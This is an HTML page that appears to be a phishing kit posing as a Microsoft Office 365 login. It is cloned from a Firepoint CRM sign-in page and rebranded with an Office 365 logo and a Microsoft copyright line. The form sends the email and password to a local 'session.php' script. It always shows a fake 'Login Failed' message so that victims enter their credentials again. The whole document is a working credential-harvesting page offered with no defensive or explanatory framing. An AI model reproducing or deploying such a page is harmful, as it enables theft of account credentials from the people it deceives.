<style>html{display:none;}</style>
<script>
   if (self == top) {
       document.documentElement.style.display = 'block';
   } else {
       top.location = self.location;
   }
</script>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
    <title>Log In | Decrypt</title>
    
    <link href='https://fonts.googleapis.com/css?family=Lato:400,300,700' rel='stylesheet' type='text/css'>
      <link rel="stylesheet" media="all" href="https://manage.firepoint.net/assets/backend-61917eed8b76c5b394a895421bc33774cb4065a48984926f7371436d80994509.css" />
    <!-- Set window variables for use by client-side tools like Bugsnag and WalkMe -->
<script type="text/javascript">
    window.releaseStage = "production";
    window.appName = "backend";
</script>

      <script src="https://manage.firepoint.net/assets/backend-1c9520eb570b159c4e8718f98515869a1c4318bd2891b92aeae4d66c1d8c6dda.js"></script>
    <meta name="csrf-param" content="authenticity_token" />
<meta name="csrf-token" content="Ny5_ssiSt4sxATlyoj7-IUnN_MGPrfelFBjM4GVDAQ7asnoMn1wErOrLjD96jv1YqwYun6gCHyUNquU22pgPTQ" />
    <script src="https://js.pusher.com/3.0/pusher.min.js"></script>
    <script type="text/javascript">
      Firepoint.pusher = new Pusher('0a448dcc0e4fe5398c5b', { authEndpoint: '/pusher/auth', encrypted: true });
        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

        ga('create', 'UA-48607917-2', 'firepoint.net');
        ga('send', 'pageview');
    </script>


    
    

  </head>
  <body class=" sessions sessions-new login-page">

    <div class="sticky-header">
      
    </div>

    
  <div class="container">
    <div class="row">
      <div class="col-sm-8 col-sm-offset-2 col-md-6 col-md-offset-3 col-lg-4 col-lg-offset-4">
        <div class="form-wrap">
          <div class="logo-wrap">
            <img class="logo" src="https://logos-world.net/wp-content/uploads/2021/02/Office-365-Logo-2013-2020.png">
          </div>
          
<div class="login-alert warning hide">
  <strong>You were logged out due to inactivity.</strong> For security reasons, please log in again to continue
</div>
<!-- unknown/other error -->
<div class="login-alert danger hide">
  <strong>An error occured.</strong> Please try again. If the problem persists, please contact <a href="mailto:support@firepoint.net">Support@Firepoint.net</a>.
</div>
<!--[if IE]>
<div class="login-alert danger">
  <strong>Please upgrade Internet Explorer.</strong> The version of Internet Explorer you're using is out of date and poses a security risk. It also doesn't support many of our great features. Please <a href="http://windows.microsoft.com/en-us/internet-explorer/download-ie" target="_blank">upgrade to the newest version</a> of Internet Explorer.
</div>
<![endif]-->
<form action="session.php" accept-charset="UTF-8" method="post"><input type="hidden" name="authenticity_token" value="f2gdH39yahOO1pnQWFXkaoXF_qb2yEl00ODq1d-DVo9yxEYbCtGRExy3hljuheGoZr2YS56I9ROLrcBMI8L3Gw" />
  <input type="hidden" name="destination_url" id="destination_url" />
  <div class="form-group">
    <input type="email" name="username" id="username" class="form-control input-lg" placeholder="Email" autocomplete="Email" required="required" />
  </div>
  <div class="form-group">
    <input type="password" name="password" id="password" class="form-control input-lg" placeholder="Password" autocomplete="Password" required="required" />
  </div>
  <button type="submit" class="btn btn-lg btn-accent submit-button">Log In</button>
  <div class="bottom-row">
    <font color="#FF0000">Login Failed. Enter Your Correct Login.</font></div>
</form>
        </div>
        <div class="login-footer">
          &copy; 2022 <a href="/?src=crm_login">
			Microsoft</a>. All Rights Reserved.
        </div>
      </div>
    </div>
  </div>


  </body>
</html>
